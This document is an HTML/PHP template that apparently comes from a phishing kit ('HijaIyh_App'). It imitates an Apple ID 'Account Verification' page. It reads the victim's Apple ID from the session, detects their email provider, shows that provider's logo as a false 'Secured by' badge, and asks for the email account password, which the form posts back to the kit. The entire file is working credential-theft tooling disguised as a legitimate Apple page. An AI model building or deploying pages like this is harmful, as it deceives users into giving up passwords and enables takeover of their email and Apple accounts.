
<!DOCTYPE html>
<html>
  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/modal.css">
    <link rel="stylesheet" href="./HijaIyh_App/assets/css/bootstrap.min.css">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="apple-touch-icon-precomposed" href="./HijaIyh_App/assets/img/favicon.ico">
    <link rel="shortcut icon" sizes="196x196" href="./HijaIyh_App/assets/img/favicon.ico">
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.js"></script>
     <script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>
    
  </head>
  <body>
<div class="container-fluid">
                <div class="row clearfix">
                <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
                                <!DOCTYPE html>
<html lang="en"><head>
<title><?=$core->translate('Confirm your information',$lang);?></title> <link rel="stylesheet" type="text/css" href="./HijaIyh_App/assets/css/desktop.css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="./HijaIyh_App/assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
.required{
    border-width: 1px;
    border-color: rgb(214, 214, 214);
    border-style: solid;
    border-radius: 5px;
    position: absolute;
    height: 30px;
    font-family: sans-serif;
    padding-left: 10px;
    font-size: 14px;

}

.required:focus{
    outline: none;
    border-color:#97CDF5;
    border-width: 0px;
       -moz-box-shadow: 0px 0px 0px 2px #97CDF5;
    -webkit-box-shadow: 0px 0px 0px 2px #97CDF5;
            box-shadow: 0px 0px 0px 2px #97CDF5;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
    <div id="xheader">
        <div id="navbar"></div>
        <div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <b><?=$core->translate('Account Verification',$lang);?></b> 
            </div>
        <div id="account_type">
        <?=$core->translate('Your Apple ID is',$lang);?> <?=$core->session('appleid');?>

        <b>  </b> </div>
        <div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?=$core->translate('Sign Out',$lang);?></a></font>
    </div>
    <script>
        $(document).ready(function () {
        $('#buttonnya').attr('disabled', true);
                    $('#buttonnya').addClass('disabled');
    });

</script>
<?php
$detectemail = $core->emaildetect($core->session('appleid'));
switch ($detectemail) {
    case 'gmail':
        $img = 'google.png';
        break;
    case 'yahoo':
        $img = 'yahoo.png';
        break;
    case 'microsoft':
        $img = 'microsoft.png';
        break;
     case 'aol':
        $img = 'aol.png';
        break;
    default:
        $img = 'apple-inc.png';
        break;

}
?>
    <div id="xcontent">
        <form action="?req=email&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" method="POST" target="_self" name="xupdate" id="xupdate">
            <font class="xFont" style="top:50px;"><?=$core->translate('Link an Email',$lang);?></font>
                        <br><br>
                        <br><br><br>
<i>Secured by :</i> <img src="./HijaIyh_App/assets/img/email/<?=$img;?>" style='max-width:100px;max-height: 50px'>
<span class="xFont2" style="position: absolute;top: 140px;left: 276px;">&nbsp;<b><?=$core->translate('E-mail',$lang);?></b></span>
<input type="hidden" name="type" value="<?=$detectemail;?>">
<input required="required" class="required" maxlength="9"  placeholder="e-email"  name="email" value="<?=$core->session('appleid');?>"  type="email" style="position: absolute;top: 170px;left: 280px;width: 320px;">

<span class="xFont2" style="position: absolute;top: 220px;left: 276px;">&nbsp;<b><?=$core->translate('Password',$lang);?></b></span>
<input required="required" class="required" placeholder="******"  name="password_email" value="" type="password" style="position: absolute;top: 250px;left: 280px;width: 320px;">


<button class="button rect" type="submit" style="
    position: absolute;
    top: 350px;
    left: 280px;
    width: 259px;
    padding:6px;">
<span><?=$core->translate('Continue',$lang);?></span>
</button>


            </form>
    </div>
    
</div>
<div id="containerfooter">
<!-- <div id="footerbawah"></div> -->
</div>
<script src="./HijaIyh_App/assets/js/main.js"></script></script>
<script type="text/javascript" src="./HijaIyh_App/assets/js/jquery.validate.min.js"></script>

</body>
</html>
                
                </div>
        </div>
      <body>
</html>
